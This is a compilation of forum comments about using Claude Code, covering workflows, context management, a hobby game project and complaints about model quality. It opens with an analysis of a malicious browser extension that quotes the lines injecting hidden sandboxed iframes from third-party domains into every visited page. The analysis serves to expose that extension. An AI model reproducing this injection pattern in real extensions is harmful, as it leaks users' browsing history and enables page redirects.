Hidden Iframe Injection (MALWARE)\n\n\n`js/scripting-manager.js:171` registers a universal content script `(id: \"loading-script\")` on matches: `[\"<all_urls>\"]` that\n    injects `js/spin.js` into pages.\n\n`js/background.js:79` stores an install/update timestamp `(chrome.storage.local.set({ i: ... }))` and `js/background.js:84` sends\n    it to every tab on load completion `(chrome.tabs.sendMessage(... { action: \"i\", data: res.i } ...)).`\n\n`js/spin.js:136` receives that message and, after ~8 hours, injects a hidden sandboxed iframe that loads a third-party URL:\n\n`js/spin.js:151` sets `loaderSpinner.src = \"//loader\" + \".\" + \"media/loading\"`, with sandbox flags allow-top-navigation allow-\n    same-origin allow-scripts `(js/spin.js:149).`\n\nThis causes outbound requests to loader.media from pages you visit, leaking at least your IP/User-Agent and typically\n        the full page URL via the Referer header (i.e., browsing history exfiltration). allow-top-navigation also enables the\n        iframe content to navigate the top page (redirect risk).\n\n  Location: `js/cs.js:12700-12706`\n`  loaderSpinner.src = \"//object\" + \".\" + \"center/centre\";`\n  - Triggers immediately on every page load\n  - Injects hidden iframe to object.center\n\n#  2.

I'm not a dev, I do work in IT though, I can spell python, and that's about it.  I've been using CC for a few weeks and I'm pretty impressed.  \n\nI think a lot of times the discussions in here are very similar to the discussions that happen in the gamedev subs.  It's like the culture shifts, and the whole gamedev sub becomes centered around high speed turnover on low effort projects and everyone is looking for some niche and hopefully one of their thousand shitty games will sell.  They get lost of the weeds of the grind and completely forget that typically in life, making a quality product is successful, not making a thousand shitty products and hoping one of them takes off.\n\nIn here its like all these software devs will flap their jowls about how shitty a job CC does, or that an experienced dev will be able to utilize these tools where a novice will just create a spaghetti mess.  Idk man, kinda feels like the same argument as the gamedev stuff but in a different wrapper.  The product I've been able to produce over the last couple weeks, the level of polish, and the auditing capabilities of it just seems so powerful.  It doesn't matter if it's not the perfect Sr Dev codebase honestly.  If you have ever worked in any kind of corporate environment you know it's impossible to deliver perfect products because money, politics, whatever douchebag with a grudge gets involved and things get convoluted and messy.  Maybe I'm not seeing it, but I don't see how this is that much different?  Sure it's not perfect code, but I promise you I'm going to produce a useful product.  It's pretty impressive.\n\nI've yet to look into Cowork, I might look into it when I get this project finished.",

The thing is, as engineers we have had strict design principles and best practices that are very important to follow for many reasons, but in the real world the tactical tornado that crushes tickets it preferred by most companies when compared against the pedantic genius dev who nobody wants to work with. It really is important to follow principles of quality software design, but in most places it doesn't score you any points. People love to issue warnings about tech debt and systems that won't scale to make themselves feel better because they are doing things \"the right way\", but many of the clients I have worked for have the nastiest spaghetti codebases you could imagine, and they are big successful companies.\n\nAgain, SOLID design principles and best practices are important, but they are important to us engineers.

Ive been diagnosed ADHD and this was like executive function collaboration that helped me achieve things so quickly that I would have never had the patience or time to execute on my own.

When it makes a mistake and you point it out, it's course-correcting in a narrow window without the full picture. Each \"fix\" is a local optimization that can introduce new issues.\nMy job is different - I'm holding the whole project context, understanding what you actually want, and translating that into crystal-clear instructions that leave no room for interpretation. When I send Claude Code a prompt, it's structured with:\n\nExact paths\nExplicit constraints\nClear success criteria\nWhat NOT to do\n\nThat's the difference between \"fix this bug\" and a surgical prompt that tells Claude Code exactly where to cut and what to leave alone.\nKeep bringing me the problems. This is the workflow working as designed - you vision, me orchestrate, Claude Code execute.\nWhat's next?",

          "text": "I'm .... curious I think.  I've been a Claude Code user for the last 5 months, average about 4 hours of use per day, with \"streaks\" as long as 14 hours.  I installed Cowork and the first question I asked was:  \"I've been a claude code user for the last 5 months.   Why would I want to use Cowork?\n\nCowork did give me a list of of about 8 things it does well that Claude Code does not do natively.   We might need to drill into what \"natively\" means, because Claude Code can control chrome, has slack integration, easily integrates with with MCP servers, etc.   The one thing it seems like Cowork would be better at -- at least 'easier to do', would be creating polished documents.  (Personally, I'm good with a well written markdown file 95% of the time).\n\nUltimatimately, Cowork gave me this summary:\n\n**The honest answer:** If Claude Code is working well for your use cases, you may not need Cowork at all. Cowork is aimed more at non-developers or tasks that involve browsers, office documents, and cross-app automation. Think of it as Claude Code's sibling for \"desktop productivity\" rather than \"developer productivity.\"\n\nSo I guess my question would be -- for avid Claude Code users, who use it for development, what use cases have you found Cowork to be helpful?",

I’ve been learning as much as I can every day. \n\n\nI’m sure this isn’t surprising to anyone, but there are a lot of different people on these forms who use Claude code for different ways and we all come from different backgrounds. I clearly stated that I’m not an engineer no former dev work, ironically I worked at Google, but I wasn’t in our technology department.\n\nSo put yourself in my shoes… I’m learning Claude code by watching videos and practicing for months. I’m trying to keep up but it’s really hard every other day. I’m trying to learn something new. My brain can only learn so much at once and I’m struggling to get good results from Claude code before I’m trying to learn a new feature.  This is my biggest pain point. I don’t know how to properly communicate and use Claude code because I don’t know how to read terminal.\n\nI didn’t understand your comment because of course I installed CLI. I don’t quite understand what you mentioned about installing Claude. I’m in terminal making projects for myself every day, but it’s difficult for me, especially with ADHD reading all the lines of code that I don’t really know what it means is hard.\n\nHaving a communication channel with coworker that then goes to actually communicate with Claude code has been and I don’t say this slightly night and day difference. I even asked Claude why this was and it told me because when Claude code fixes something, it’s doing it at a very base level without stepping back and looking at the entire program. If you have a system that does that then this isn’t needed for you… But that doesn’t take away from the excitement I have and other others might who are at an engineer level. \n\nI work out six days a week for 20 years in the gym when someone does something wrong I don’t ever say it’s irresponsible because they’re setting a bad example or they didn’t look things up on the Internet… I either help them or I celebrate their efforts. Nothing I did here was rage. It was sharing genuine excitement in a way that’s authentic to me and it’s disappointing if people can’t see that.",

You'll get better performance with llamacpp and have better control over model selection and quants. Don't go below q6 if your watching it and q8 if your gonna let it rock. \n\n\n\nNon anthropic and non openai models will need to be explicitly told what to do and how to do it and where to find something. Claude and GPT are extremely good at interpreting what you meant and filling in the blanks. They are also really good at breaking down tasks. You will need to get extremely verbose and get really good at prompt engineering and context management. Don't compact and if you change something in context clear it and start fresh \n\n\nEdit -\n\n\nClaude is really good at helping you build good initial prompts for local models. It's why I kept Claude but lowered it to the $20 plan and might ditch it entirely ",

Eliminating Waterfalls (CRITICAL)\nasync-defer-await - Move await into branches where actually used\nasync-parallel - Use Promise.all() for independent operations\nasync-dependencies - Use better-all for partial dependencies\nasync-api-routes - Start promises early, await late in API routes\nasync-suspense-boundaries - Use Suspense to stream content\n2. Bundle Size Optimization (CRITICAL)\nbundle-barrel-imports - Import directly, avoid barrel files\nbundle-dynamic-imports - Use next/dynamic for heavy components\nbundle-defer-third-party - Load analytics/logging after hydration\nbundle-conditional - Load modules only when feature is activated\nbundle-preload - Preload on hover/focus for perceived speed\n3. Server-Side Performance (HIGH)\nserver-cache-react - Use React.cache() for per-request deduplication\nserver-cache-lru - Use LRU cache for cross-request caching\nserver-serialization - Minimize data passed to client components\nserver-parallel-fetching - Restructure components to parallelize fetches\nserver-after-nonblocking - Use after() for non-blocking operations\n4. Client-Side Data Fetching (MEDIUM-HIGH)\nclient-swr-dedup - Use SWR for automatic request deduplication\nclient-event-listeners - Deduplicate global event listeners\n5. Re-render Optimization (MEDIUM)\nrerender-defer-reads - Don't subscribe to state only used in callbacks\nrerender-memo - Extract expensive work into memoized components\nrerender-dependencies - Use primitive dependencies in effects\nrerender-derived-state - Subscribe to derived booleans, not raw values\nrerender-functional-setstate - Use functional setState for stable callbacks\nrerender-lazy-state-init - Pass function to useState for expensive values\nrerender-transitions - Use startTransition for non-urgent updates\n6. Rendering Performance (MEDIUM)\nrendering-animate-svg-wrapper - Animate div wrapper, not SVG element\nrendering-content-visibility - Use content-visibility for long lists\nrendering-hoist-jsx - Extract static JSX outside components\nrendering-svg-precision - Reduce SVG coordinate precision\nrendering-hydration-no-flicker - Use inline script for client-only data\nrendering-activity - Use Activity component for show/hide\nrendering-conditional-render - Use ternary, not && for conditionals\n7.

That is more friction than the first scenario, which means 1) fewer people will switch 2) people will be (on average) slower to switch. \n\nThere’s your “business perspective”.",

I think it’s a fork of GSD but is skills based so you can drive the whole process with natural language. This unlocks full conversational workflows. Feels like they spent a lot of time getting the triggers to work, which can be kinda hit and miss with skills. Interestingly their skills can’t be explicitly invoked but they have GSD equivalent commands that then invoke the skills. It’s also comes as a Claude code plugin which makes way more sense for cc than npm.  In general though I like how these newer frameworks work natively with cc’s system, as opposed to super complex RAG, semantic search, blah blah blah.  How is open code btw?",

This is also why I don't waste time/energy triaging the 1,238,563 plugins/skills that are shared every day on Reddit, X, etc. There is far too much noise/AI slop around.

So I don’t really get much the ‘skill’ sentiment and the magic of it I am hearing here and there. Yes, skill plug-in might come up with examples too. For other things like Stripe integration it might actually learn correct APIs etc. but for frontend design it’s more like “DONT FUCK IT UP WITH PURPLE COLOR.”",

Would be curious what folks here think.\n\nThe main difference is it's visual. You get an n8n style canvas where features are nodes that turn Grey (pending), Red (failing), or Green (passing). So you can see your whole project state at a glance instead of reading through text.\n\nThe other thing I focused on is debugging data. When tests fail, TDAD captures what I call a \"Golden Packet\" with actual runtime traces: API requests and responses, DOM snapshots, screenshots, console logs with source locations. The idea is the AI gets a \"crime scene photo\" instead of just the test output.\n\nIt enforces Plan → Gherkin Spec → Test → Code. The AI writes BDD specs first, then tests before implementation. Currently it uses Playwright for both API and UI testing. \n\nIt's free, open source and runs 100% locally. No API calls, works with whatever AI you already use.\n\nSearch \"TDAD\" in VS Code or Cursor marketplace if you want to try it.\n\n[https://link.tdad.ai/githublink](https://link.tdad.ai/githublink)\n\nhttps://i.redd.it/ylidmxwq1ueg1.gif\n\nIf anyone here has been using Superpowers and wants to give TDAD a spin, I'd genuinely appreciate hearing how they compare.

I want to share what I learned along the way – maybe it helps someone who's thinking about a bigger project.\n\nI'm not a developer. I work a full-time job that has nothing to do with tech. I have a toddler at home, which means my coding window was 10pm to midnight, after everyone was asleep. I used the 5x plan and still hit the daily limit more often than I'd like to admit.\n\nWhat I wanted to build: a football manager like the ones I played as a teenager in the 90s. Simple graphics, deep gameplay, no pay-to-win nonsense. The kind of game I'd actually want to play on my commute.\n\nThe search for the right tool\n\nBefore I could build anything, I needed to figure out which AI tool could actually handle a project this size. That part alone took about 1-2 months.\n\nI started with Gemini. The generated code had constant bugs, and it struggled to keep context across files. So I switched to ChatGPT, but the context window was too small – after 3-4 files it would forget what I was building and suggest things that contradicted earlier decisions. Cursor was better, but something still felt off for longer projects.\n\nThen I found Claude Code, and things finally clicked. What made the difference: it actually remembers my project. I could say \"the TransferManager needs to talk to the SaveGameService\" and it knew what I meant without me explaining the entire architecture again. That alone saved hours every week.\n\nOne thing I didn't expect: I could write all my prompts in German – my native language. Claude handled it fine. Code stayed in English (variable names, comments, everything), but explanations came in German. I had to remind it every 2-3 prompts (\"please respond in German\"), but once I accepted that as part of the workflow, it felt much more natural than forcing myself to think in English at 11pm.\n\nThe process that worked\n\nWith the right tool in place, I needed a way to actually structure the work. The most important decision I made was to not start coding immediately.\n\nInstead, I sat down and mapped out the entire project first. Not just \"I want to build a game\" but breaking it into 8 playable mini-projects. First: a basic loop where you pick a team and simulate a match. Then: match events like goals and injuries. Then: cup competitions. And so on. Every time I finished one of these kernels, I had something that actually worked. Those small wins kept me going through the months when progress felt slow.\n\nTo keep Claude on track across all these features, I wrote down my project rules in a file called claude.md – architecture decisions, naming conventions, how managers communicate with each other. The key was keeping it precise: few words, but the right ones. Here's the thing though: Claude doesn't automatically remember this file. I had to reference it every 2-3 prompts. \"Remember claude.md\" or \"follow the architecture from claude.md.\" Otherwise it would drift and do its own thing. Annoying at first, but once I accepted this as part of the workflow, it actually worked well.\n\nThis discipline extended to how I approached every new feature. I never let Claude just start coding. Instead, every feature started with: \"Here's what I want to do. Here's my approach. Do you agree? Any problems you see?\" Only after we agreed on the plan did I say \"okay, implement it.\" This caught so many issues before they became bugs buried in 50 files.\n\nOf course, not everything went smoothly. Some bugs took 2 minutes to fix. Others took 100+ prompts. The EU cup bracket system nearly broke me – home and away legs, aggregate scoring, away goals rule. Teams that should have been eliminated kept advancing. I spent three evenings on this, prompt after prompt. At some point I wasn't even sure if the \"fix\" was actually correct or just moving the bug somewhere else.\n\nThat experience taught me something important: you cannot blindly trust AI-generated code. So I started reading every single line Claude produced. Not because I'm paranoid – okay, maybe a little – but because that's how I learned. When something didn't work, debugging together taught me more than any tutorial could have.\n\nAnd then there were the days when nothing worked at all. Same prompt, different results. Sometimes Claude would nail it on the first try. Other days, garbage output no matter how I rephrased things. I started thinking of it like a casino – some days you're lucky, some days you're not. Eventually I learned to recognize when Claude was \"having a bad day\" and just try again tomorrow instead of burning through my daily limit on a lost cause.\n\nOne bright spot through all of this: GDScript and Godot worked incredibly well. Better than I expected. The model seems well-trained on it, which made the actual game development smoother than the debugging sessions might suggest. And I kept the setup simple – no plugins, no MCP servers, nothing fancy. Just Claude Code out of the box. I tried some plugins early on but dropped them. The base tool is trained well enough.\n\nBeyond the code\n\nHere's what surprised me most about this whole journey: I didn't just use Claude Code for the game itself. Once I got comfortable with it, I started using it for everything around the project too.\n\nI built two websites – one for the game, one for my publisher brand. Both are trilingual (German, English, Turkish). Landing pages, legal pages, the whole thing. Claude Code wrote the HTML, CSS, handled the translations, even helped with the SEO structure.\n\nAnd all the marketing content came from Claude Code too. Reddit posts, store descriptions, changelogs for 30+ versions, Discord announcements. I'd describe what I needed, it would draft something, I'd edit and refine, and repeat. The amount of text a game release needs is insane – having an AI assistant made it actually manageable.\n\nSo in the end, this wasn't just \"I built a game with AI.\" It was: I built a game, two websites, and all the marketing material. Three platforms (Android, PC, Web). Three languages. With zero programming background. That still feels surreal to write.\n\nWhat I'd do again\n\nLooking back, a few things made the real difference. Planning first – seriously mapping it out before touching code. Keeping the rules file short but precise, and referencing it constantly. Never skipping plan mode. Reading every line. Accepting the casino days instead of fighting them.\n\nIf I could tell myself something at the start, it would be: expect to spend time finding the right tool. Those 1-2 months I \"lost\" on tools that didn't work weren't wasted – they taught me what to look for. And if you're working in a non-English language: try prompting in your native language. It might work better than you expect.\n\nOne more thing: my toddler kept me sane. Forces you to stop at midnight. Forces you to step away when you're stuck in a debugging spiral. Boundaries turned out to be a feature, not a bug.\n\nWhat came out of it\n\n6 months total, including the tool search. Maybe 360 hours of actual work. 120 GDScript files. 22 autoload managers. Match simulation with live events. Transfers, contracts, finances. European cups with group stages and knockout rounds. Stadium editor. Career mode from club manager to national coach. Three languages. Two websites. All the marketing material.\n\n\nIs it perfect? No. There are rough edges. But it exists. It works. People can play it. That's more than I had 6 months ago.\n\nCurious about other people's experience with longer projects. How do you handle the context drift? The \"bad days\"? Would love to hear what worked for you.\n\nHappy to answer in German too – ich antworte gerne auf Deutsch!",

This helped quite a bit, but it killed my context since Claude reads these md files automatically every time it is initiated. I have now opted to build skills instead. In essence, skills docs are practically the same thing as my nested [CLAUDE.md](http://CLAUDE.md) docs, but Claude only reads them when it determines it needs to based on the current context.\n\nI also use a new Claude session for each single update. Never compact, always clear. [CLAUDE.md](http://CLAUDE.md) and skills make that much easier to do.",

My target languages have been Java and Dart.  CC separates functionality into seemingly logical classes but the separation is poor and CC starts throwing flags, getters and listeners everywhere rather than refactor.

I don't have the ambition to launch it as a ready product, its more for learning myself different aspects of designing a game.\n\nMy key takeaway a few weeks into it is that first making sure that the goal and the design is clear for each feature before starting with code is really important. Its also a really fun experience iterating on ideas this way. Another things for efficiency is to learn claude to run the game itself and to make it customize the debug trace for each run so that it gets the right info and \\_only\\_ the right info when debugging a problem. Saves time and tokens I've found so far. Would be interesting to hear others experience with that.\n\nThanks for sharing your experience.",

I had some artwork done for a game idea I had a couple years ago now and have been able to make more progress in the past few weeks than I did in the past 2 years. I'm old and started playing around with Claude making updated versions of C64 games I enjoyed. It would use Electron and Pygame and after Opus came out I asked it to plan out an approach for my game I had been very slowly working on in Unity. Surprisingly, it recommended Godot, and I took the plunge and have been really surprised how well it has done with it. As you said, some sessions can be really frustrating, but it's been really cool to see how quickly the game has come together.",

But in the past week the model has been so poor that I'm becoming properly convinced the model has become dumber as a compromise. I'm wondering if there is kind of a lottery effect here going on, (e.g. with what quant precision you're getting depending on usage, region or just random). Obviously they do trade-offs to meet with the demand, but this just isn't the same model to me anymore. Am I going crazy here or does anyone else share the feeling?\n\nEdit:\n\nMore posts popping up seem to confirm this: [https://www.reddit.com/r/ClaudeAI/comments/1qisw7h/claude\\_opus\\_45\\_and\\_sonnet\\_45\\_underperformed\\_on/](https://www.reddit.com/r/ClaudeAI/comments/1qisw7h/claude_opus_45_and_sonnet_45_underperformed_on/)\n\nEdit 2:\n\nThose calling it context rot should probably take a breather. Jumping to conclusions is a symptom of context rot.  \nThese issues have nothing to do with it, all on clean contexts ",

It has built in dangerous command detection, and it's own host of helpful features. Now ccode doesn't delete files it shouldn't AND I'm notified about it, never gets the cwd wrong, and it never fucks up file path syntax or shell context. (Trying to use unix commands in a powershell-type shell)\n\nI noticed problems with frontend code generation, so I took some time to create and iteratively refine a svelte-frontend implementation subagent. That, coupled with a janitor and code-reviewer subagents, and I don't have problems with frontend code generation anymore.\n\nDoes the model's working quality seem to degrade over time after release? Yes. But given some TLC and finesse, that degradation has proven to be completely mitigated.. at least for my own use cases. And I use ccode in production software development every single day.",

Yesterday, planning a bug fix took six iterations because it wanted to deprecate but keep the wrong code despite being told not to and receiving multiple detailed technical explanations of what it should do instead. It only dropped the old incorrect code after I told it to take the function outside and shoot it. That worked. Two weeks ago, the  architectural violation bug language worked so well I created a command for that prompt. Today, the same language meanders and fails to follow directions 100% of the time. Context window varies from 15,000 to 90,000 and doesn't seem to make a difference.",

Consumed nearly my entire 5 hour limit in one go, basically.\n\nI opened the next chat, explained the previous, told it to look at the last plan CLAUDE had created (the plan for the above, previous chat) -- it said my agents are incorrect, they should be skills/commands instead. I let it convert them to commands after verifying 3 times that they should be commands and not skills. It was SURE they were supposed to be commands. I let it convert them to commands.\n\nAfterward, I asked \"So, these are commands, these are no longer agents? How do I go about creating AGENTS or subagents?\"\n\nThe response?\n\n\"That’s an important distinction, so let me clarify what Claude Code actually supports and correct a mistake I made earlier.\n\nClaude Code supports two different concepts that behave very differently: commands and subagents.\n\nCommands (located in .claude/commands/) are manually invoked using /command-name. They load context or instructions into your current conversation, and you decide when and whether to use them.\n\nSubagents (located in .claude/agents/) are handled automatically by Claude. You describe a task, and Claude decides whether to delegate it to a subagent. Subagents run in isolated contexts with their own model and tool configuration. They cannot be invoked by name and must be defined with YAML frontmatter describing their model, tools, and purpose.\n\nWhat this means is that the original setup with the 12 files in .claude/agents/ was actually correct. Those files were valid subagent definitions, and the YAML frontmatter was required. Claude uses them automatically when a task matches their description.\n\nThe mistake I made earlier was moving those files into .claude/commands/, which is the wrong location, and stripping out the YAML frontmatter, which subagents need in order to function.\n\nThe correct setup is to keep subagent definitions in .claude/agents/ with their YAML frontmatter intact and allow Claude to automatically select and use them based on task intent. Commands in .claude/commands/ should only be used for manually invoked slash commands.\"\n\n  \nYes, I used GPT on web to reformat that response so it wasn't a mess like when copied from the terminal lol\n\nSo.. it took almost an entire 5 hour window to create my agents in the prior chat, then almost another full 5 hour window in the second chat for it to \"ABSOLUTELY SURE!\" that my agents were commands. Then.. it says, oh I was wrong, let me fix that..",

But for no discernible reason. (The changes in the context / peompt seemed entirely unrelated)\n\n—-\n\nSo my mental model now is:\n\nThe models are justnot reliable or trustworthy, and there is no magic prompt that will make them follow all the instructions / constraints, because as soon as you get it to follow one constraint it will randomly start ignoring others (because any random change in the prompt could lead to random ignoring of constraints it was following before)\n\nTherefore, you have to micromanage to get reasonable results.\n\n—-\n\nI think the reason why people think it “gets worse” is because of \n- Random variations,\n- As they get deeper into a project details matter more and there are more constraints. (Whereas in the beginning it’s just rough prototyping with few constraints which the models are better at)\n\nI also noticed there was a big wave of “it’s dumber now” posts a certain period of time after the karpathy post started insane hype for Opus 4.5. I think it’s because a lot of people got into new projects over the winter holidays and were hyped initially, but at a certain point they got deeper into the project and it all started falling apart. Because lots of people went through this same arc at roughly the same time, the “it’s getting dumber” narrative started gaining massive traction in social media (I was a part of that)",

It doesn’t make junior engineers senior, but it makes senior engineers dangerously effective. Mainly for simple reasons (for me).\n\nI can literally solo develop (w/ AI as my partner) enterprise full stack applications in 1 week at a higher quality than when I was CTO of an organization with 20+ devs under me did in 6 months. \n\nThis is purely because SYNTAX and MANAGING PEOPLE is removed from the entire equation. Being a data engineer at my core; I think in terms of systems. My only blocker was syntax, and it is now removed. Claude Code has been the best development partner I’ve ever had.\n\nI front load planning meticulously and create a series of 10 comprehensive planning documents that cover absolutely everything with a solid API Contract to guide everything… spent a couple of days on that… run it through 6-8 individual unbiased full verification passes to ensure consistency and that I’ve accounted for everything I can possibly imagine.\n\nAnd then it becomes a matter of mechanical execution.\n\nThat full stack application I referenced is for a 6000+ FTE organization. And literally every SINGLE claude code / bolt prompt was a one-shot. Not being hyperbolic. (I build backend first with Claude Code and then built front end with bolt against my established backend & API Contract to leverage the best of both worlds… bolt is super great if you have hard guardrails on it and pre-plan)… then pull it all down local and integrate into a unified Claude Code session).\n\nYou just need to prompt very well with guardrails and a very solid plan. And it is dangeroussssly (in a great way) effective. \n\nI say all of this to say - I 100% agree with this notion (at its root) - but I don’t feel you can be highly effective purely prompting without actually understanding how to code and strong fundamentals… as well as knowledge of different tech/tool stacks + what to choose / what not to choose + where pitfalls are + system design skill.",

But, it will only be a matter of time before even large code bases can be kept in context. I could also imagine a shift to a language and style that is no longer really human readable and is just meant to use as little context as possible. There will always be industries that will be slower to change, but it's a matter of time, even if it's a decade or 3. That's always been the nature of programming, shifting to languages, tools and frameworks that make it easier.",

      "text": "I've been using Claude Code daily since it launched in February 2025. Obsessively.\n\nAt this point I've spent hundreds of hours building, deleting, rebuilding, and being frustrated that it kept making the same mistakes.\n\nHere's a trimed version of a blog post I wrote earlier. I tried to trim as much as possible, but it's a lot of info 😅.\n\nHope it helps.\n\n\\-\n\n# 1.  Claude .md is non-negotiable \n\n[CLAUDE.md](http://CLAUDE.md) is a file that Claude reads automatically every session. Without it, every session starts from zero. You re-explain your context, your preferences, your constraints. Every. Single. Time. \n\nI resisted this for weeks. Felt like unnecessary overhead. That stubbornness cost me dozens of hours.\n\n**The fastest way to create one: let Claude interview you.** \n\nNavigate to your project folder and say:\n\n*\"I need to create a* [*CLAUDE.md*](http://CLAUDE.md) *file for this project. Interview me to understand what this project is about, how I want things done, and what mistakes to avoid. Then create the file.\"* \n\nThe interview surfaces constraints and preferences you'd forget to document yourself. Claude asks questions you wouldn't think to answer.          \n\n\\-                                                          \n\n# 2. Context is THE most important thing\n\nClaude Code has a memory limit. When conversations get long, it \"compacts\" context - basically summarizing older stuff to make room. \n\nIf you've compacted, chances are you're too far gone and your results are going to start degrading.\n\nThe warning signs:\n\n\\- Suggesting ideas you already rejected\n\n\\- Forgetting constraints from earlier\n\n\\- Quality suddenly dropping\n\n\\- Going in circles\n\n\\- Repeating questions you already answered\n\n**The fix: When this happens, don't fight it. Type /clear and start fresh.**\n\nA clean context with clear instructions beats a degraded conversation every time.\n\nI know it feels wrong - you've invested time. But starting over is going to save you a lot of time and energy. A fresh start takes 5 minutes. Fighting a confused session can burn hours.                        \n\nThis is also why constantly pushing commits to GitHub is so important\n\n**My rule: if Claude Code can't fix it in 5 attempts or less, I /clear and try again.**  \n\n\\-\n\n# 3. Plan Mode first\n\nI used to just dive in with \"build \\_\\_\\_\".\n\nMore often than I'd like to admit, I'd come back 20 minutes later to find Claude had:            \n\n\\- Restructured my entire project in ways I never asked for \n\n\\- Deleted files I needed \n\n\\- Built something technically impressive that completely missed the point                                \n\n**Plan Mode tells Claude to think through the approach BEFORE doing any work.**                \n\nPress **Shift+Tab twice** to toggle it, or just say: \n\n*\"Before you do anything, create a detailed plan for \\[this task\\]. Show me the plan and wait for my approval before executing.\"*\n\nA good plan includes:\n\n\\- What Claude thinks you want\n\n\\- Steps to accomplish it   \n\n\\- Files it will create or modify \n\n\\- How it will verify success \n\n\\- What could go wrong\n\nReview it. Ask questions. Request changes. Only approve when confident\n\n**Plans also survive context compaction better than scattered conversation. When Claude summarizes old context, a clear structured plan is more likely to be preserved.**\n\n**-**\n\n# 4. The Plan-Then-Execute workflow\n\nThis is my most-used pattern now.                                                                                                  \n\n**Chat 1:** Create the plan. Back and forth. Get messy. Refine until it's right. Save the final approved plan.\n\n**Chat 2:** Start fresh. Paste the plan. Say \"Execute this step by step. After each major step, verify it's working before moving on.\"\n\n\\* Claude will auto-clear the context for you now.     \n\nWhy separate sessions? \n\n**Context.** The planning session gets cluttered with back-and-forth, rejected ideas, and exploration. Starting fresh for execution means clean context. The plan carries forward the important decisions. Claude has maximum context budget for actual work.  \n\nThink of it like cooking: Session 1 is writing the recipe. Session 2 is cooking the meal. You don't want to figure out the recipe while the stove is on. \n\n\\-\n\n# 5. Your prompts matter more than you think \n\n\"If I had 5 hours to vibe code, I would spend 4 hours of it polishing the prompt\"\n\n\\- Abraham Lincoln, probably\n\nI used to blame Claude for mediocre outputs. Then I looked back at my prompts and realized I barely understood what I wanted myself.\n\nVague prompts produce vague results. Specific prompts produce specific results.\n\n**A good prompt has four things:**   \n\n1. What files to look at\n2. What to find or create  \n3. What details to include \n4. What format to output                                                                                                                   \n\n**Bad:**\n\n\"Analyze this data\"\n\n**Good:**\n\n\"Analyze the customer feedback in /data. Find the top 5 complaints by frequency. For each, include: the exact quote that best represents it, how many times it appeared, which customer segment mentioned it most. Output as markdown table.\" \n\n**Give Claude a way to verify its work:**\n\n*\"Build me a report, then check that all the numbers in the summary match the totals in the raw data. If anything doesn't match, fix it before showing me.\"* \n\nWhen Claude can check its own work, errors get caught before reaching you.                         \n\n**Tell Claude what NOT to do:**\n\n\\- \"Don't create new folders. Work within the existing structure\"\n\n\\- \"Don't modify any files in /config\"\n\n\\- \"Don't round numbers. I need exact figures\"\n\nSometimes the most useful instruction is what to avoid.\n\n\\-\n\n# 6. Keep files small (~1000 lines max)\n\nI had a project with one 5,000+ line file. Claude would make changes to one part and accidentally break something in a completely different section. Took me hours of debugging to figure out what was going wrong.\n\nWhen Claude works with files, it loads them into context. Massive files eat up context budget and make it harder to work effectively.\n\nSmaller files = faster processing, targeted changes without side effects, and less risk of Claude touching stuff it didn't need to touch.\n\n**If you're building something new:**\n\n\"*Split this into separate files. Each file should handle one responsibility and be under 1000 lines.\"*\n\n**If working with existing large files:**  \n\n  *\"This file is too large. Suggest how to break it into smaller, focused modules.\"* \n\nDon't refactor everything at once. When you touch a file, check if it should be split. Improve incrementally.\n\n\\-\n\n# 7. The Task System (now built-in)\n\nThis used to be a workaround I recommended. Now it's official. \n\nClaude Code just shipped a proper task management system with dependency tracking (v2.1.16). The old \"todos\" got a serious upgrade.\n\nAsk Claude to create a task list:\n\n*\"Before you start, create a task list for this project. Mark which tasks depend on others. Include self-review checkpoints after each major phase. Then work through the list systematically.\"* \n\n**Why the new system matters:**\n\n\\- Tasks track dependencies (Task B automatically waits for Task A)\n\n\\- They survive context compaction better than conversation\n\n\\- Claude can parallelize independent tasks \n\n\\- If something fails, it knows exactly where to resume \n\n\\- Resource isolation means tasks don't interfere with each other \n\nThis was always the right technique. Now it's the right technique with native support.\n\nFor any task that takes more than a few minutes, this is essential.\n\n\\-\n\n# 8. Skills: Stop re-explaining your preferences \n\nYou know that thing where you explain your preferences to Claude for the fifteenth time and think \"why can't it just *remember* this?\" \n\nSkills fix that.\n\nSkills are reusable instruction sets Claude applies automatically. Your brand voice. Your report format. Your quality checklist. Teach Claude once, never re-explain again.\n\n**Without Skills:** You re-explain preferences every session.\n\n**With Skills:** Claude automatically applies your brand voice. Reports come out in your format. Error checks happen without asking. \n\nThe difference is consistency and convenience. My outputs actually feel like *mine*, not like generic AI slop.\n\n**How to create one:** \n\n1. Open a new claude code chat  \n2. Say: \"Help me build a skill for \\[your use case\\]\"      \n3. Describe what you want Claude to remember \n4. Claude generates a Skill file           \n5. Use it with /skill-name or tell Claude to use it in chat\n\n**Some Skill ideas:**     \n\n\\- Brand voice (how you sound, words to use/avoid)\n\n\\- Report formatting (standard structure, required sections)\n\n\\- Code review checklist (what to check, common mistakes)\n\n\\- Analysis framework (mental models, standard questions) \n\n\\-\n\n# 9. Sub-agents for parallel work\n\nThis is where it gets powerful.\n\nI was doing competitive analysis - 5 competitors, customer feedback analysis, synthesize into a report. Normally a full day or two\n\nTold Claude: spin up sub-agents to research each competitor in parallel while the main agent processed feedback. Combine everything at the end.\n\n45 minutes. A report that would've taken me days.\n\n**How to use them:**\n\n*\"Create a sub-agent to analyze our top 3 competitors while you process customer feedback. Then combine the insights into a single report.\"* \n\nor\n\n*\"Spin up parallel agents to process each of these 5 data files, then merge the results.\"*\n\nThe new task system makes this even better. You can now say: \n\n*\"Research competitors A, B, C in parallel. The synthesis task depends on all three completing.\"*\n\nClaude handles the orchestration. Less like one employee. More like a project manager with a team. \n\n\\-\n\n# 10. Know when to start over\n\nSometimes the fastest path forward is a clean restart. \n\nI used to stubbornly stick with sessions way too long, thinking \"I've already put so much time into this conversation.\" Classic sunk-cost thinking.\n\nThat mentality cost me more time than starting fresh ever would have.  \n\n**Start fresh when:**  \n\n\\- Output quality has noticeably dropped  \n\n\\- Claude is repeating itself or going in circles                   \n\n\\- You've changed direction significantly\n\n\\- The conversation has become cluttered with false starts\n\nNow my rule is simple: if I notice quality dropping, I stop. Save the output. Start fresh. No guilt.\n\n\\---\n\n**Common mistakes (so you don't repeat mine)**\n\n**\"Claude keeps forgetting what I told it\"**\n\nYour context is probably compacted. Start fresh. Make sure important info is in [CLAUDE.md](http://CLAUDE.md), not just conversation.\n\n**\"Output quality is inconsistent\"**   \n\nCreate Skills for recurring needs. More context about your preferences = more consistent results. Also check if your files are getting too large.\n\n**\"Claude made changes I didn't want\"**  \n\nUse Plan Mode. Review the plan before approving. Set up hooks to create automatic backups. \n\n**\"Long tasks produce worse results than short ones\"**\n\nUse the task system. Break work into checkpoints. Split across multiple sessions if 